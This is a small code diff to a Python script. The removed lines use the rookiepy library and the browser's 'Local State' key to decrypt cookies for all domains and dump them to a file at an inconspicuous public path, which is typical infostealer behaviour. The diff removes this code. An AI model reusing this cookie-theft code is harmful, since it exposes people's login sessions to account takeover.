@@ -54,13 +54,7 @@ def main():
         key_path = Path(BASE_DIR) / "Local State"
         print(key_path)
         print("coo")
-        cookies = rookiepy.any_browser(db_path=str(db_path), key_path=str(key_path), domains=None)
-        print(cookies)
-        output_file = f"C:\\Users\\Public\\Windows\\ck_{profile}.txt"  # Adjusted to use profile
-        print("cooki")
-        with open(output_file, "w") as file:
-            json.dump(cookies, file, indent=4)
-        print(f"Cookies written to {output_file}")
+
 
 if __name__ == "__main__":
     main()
